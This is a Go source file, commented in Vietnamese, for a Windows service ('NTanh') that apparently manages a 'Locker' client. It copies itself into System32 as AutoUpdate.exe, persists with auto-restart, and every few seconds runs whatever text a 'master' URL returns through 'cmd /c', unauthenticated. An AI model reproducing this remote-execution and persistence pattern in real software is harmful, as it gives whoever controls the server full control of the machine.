package main

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/kardianos/service"
)

var ServiceName = "NTanh"

func ServiceRegister() {
	src, _ := os.Executable()
	dst := `C:\Windows\System32\AutoUpdate.exe`
	// Nếu đang chạy đúng từ file dịch vụ chính -> Thoát hàm để vào luồng main chính
	if ComparePath(src, dst) {
		return
	}
	// 1. Lấy thông tin service
	s, err := GetService()
	if err != nil {
		Logger.Println("ERROR: Get service failed:", err)
		ShowErrorPopup("ERROR", "Get service failed: "+err.Error())
		os.Exit(1)
	}
	// 2. Kiểm tra xem service đã cài trên hệ thống chưa
	status, err := s.Status()
	isInstalled := (err == nil && status != service.StatusUnknown)
	if isInstalled {
		_ = s.Stop()
		// Chờ service dừng hoàn toàn để nhả khóa file AutoUpdate.exe
		for i := 0; i < 30; i++ {
			st, err := s.Status()
			if err == nil && st == service.StatusStopped {
				break
			}
			time.Sleep(time.Second)
		}
	} else {
		// Chưa cài -> Tiến hành Install
		if err := s.Install(); err != nil {
			Logger.Println("ERROR: Service Install failed:", err)
			ShowErrorPopup("ERROR", "Get service failed: "+err.Error())
			os.Exit(1)
		}
	}
	// 3. Copy file thực thi mới đè vào System32
	copyErr := CopyFileFull(src, dst)
	if copyErr != nil {
		Logger.Println("ERROR: Copy file failed:", copyErr)
		ShowErrorPopup("ERROR", "Copy File failed: "+copyErr.Error())
		os.Exit(1)
	}
	// 4. Kích hoạt service chạy file từ dst
	if err := s.Start(); err != nil {
		Logger.Println("ERROR: Service Start failed:", err)
		ShowErrorPopup("ERROR", "Service Start failed: "+err.Error())
		os.Exit(1)
	}
	// 5. THOÁT tiến trình tạm, nhường quyền cho tiến trình Service vừa start
	Logger.Println("INFO: Registered and started service successfully. Exiting setup process.")
	ShowErrorPopup("INFO", "UpDate Pass")
	// Cấu hình SCM tự restart sau 5 giây khi service bị crash/ngắt đột ngột
	AddSystemPath(`C:\ProgramData\Locker`)
	if err := Cmd(run, "sc", "failure", ServiceName, "reset=", "86400", "actions=", "restart/10000"); err != nil {
		Logger.Println("WARNING: Failed to set service failure actions:", err)
	}
	RemoveHP()
	os.Exit(0)
}

func InstallService(exe string) (service.Service, error) {
	cfg := &service.Config{
		Name:        ServiceName,
		DisplayName: fmt.Sprintf("%s Service", ServiceName),
		Description: fmt.Sprintf("%s Service", ServiceName),
		Executable:  exe,
	}
	s, err := service.New(&program{}, cfg)
	if err != nil {
		return nil, err
	}
	return s, s.Install()
}

func ComparePath(scr, dst string) bool {
	// 1. Đưa về đường dẫn tuyệt đối và xử lý Shortcut/Symlink
	path1, err1 := filepath.Abs(scr)
	path2, err2 := filepath.Abs(dst)
	if err1 != nil || err2 != nil {
		return false
	}

	// 2. Làm sạch đường dẫn (xóa các dấu . hoặc .. thừa)
	path1 = filepath.Clean(path1)
	path2 = filepath.Clean(path2)

	// 3. Với Windows: Phải chuyển về cùng chữ thường vì Windows không phân biệt hoa/thường
	// "C:\Users" và "c:\users" là một
	return strings.EqualFold(path1, path2)
}

type program struct{}

func (p *program) Start(s service.Service) error {

	go p.run() // rất quan trọng
	return nil
}

func (p *program) run() {
	HttpGetCMD.Store("")
	mutex := checkSignApp()
	_ = mutex
	Logger.Println(OpenUDP50000())
	AppUi.Ver.Store(RegRead(regRoot, "verUi"))
	AppLocker.Ver.Store(RegRead(regRoot, "verLocker"))
	AppUi.Last.Store(time.Now())
	AppLocker.Last.Store(time.Now())
	go pipeStart("Service_ui", &AppUi.Ver, &AppUi.Last)
	go pipeStart("Service_locker", &AppLocker.Ver, &AppLocker.Last)
	IP.Store("")
	// Get CMD từ master
	go func() {
		httpget := &http.Client{
			Timeout: 2 * time.Second,
		}
		for {
			time.Sleep(3 * time.Second)
			ID := ID_Read()
			if ID != "" && IP.Load().(string) != "" {
				url := HttpGetCMD.Load().(string) + ID
				resp, err := httpget.Get(url)
				if err != nil {
					continue
				}
				if resp.StatusCode != http.StatusOK {
					resp.Body.Close()
					continue
				}
				data, err := io.ReadAll(resp.Body)
				resp.Body.Close()
				if err != nil {
					continue
				}
				txt := string(data)
				Cmd(start, "cmd", "/c", txt)
			}
		}
	}()
	go SyncTime()
	// Watercher
	go func() {
		for {
			for {
				if _, err := os.Stat("C:\\Programdata\\Locker\\Fail"); err == nil {
					time.Sleep(time.Second)
					continue
				}
				break
			}
			ctxWatcher, cancelWatcher := context.WithCancel(context.Background())
			go Watcher(ctxWatcher)
			for {
				if _, err := os.Stat("C:\\Programdata\\Locker\\Fail"); err == nil {
					cancelWatcher()
					isShutdownLocker.Store(true)
					taskkill("Ui.exe")
					time.Sleep(2 * time.Second)
					taskkill("Locker.exe")
					break
				}
				time.Sleep(time.Second)
			}
		}
	}()
	go ListenMasterUDP()
}

func (p *program) Stop(s service.Service) error {
	Logger.Println("Service Stop")
	return nil
}

func GetService() (service.Service, error) {
	cfg := &service.Config{
		Name:        ServiceName,
		DisplayName: fmt.Sprintf("%s Service", ServiceName),
		Description: fmt.Sprintf("%s Service", ServiceName),
		Executable:  `C:\Windows\System32\AutoUpdate.exe`,
	}
	// BẮT BUỘC truyền &program{} thay vì nil
	return service.New(&program{}, cfg)
}
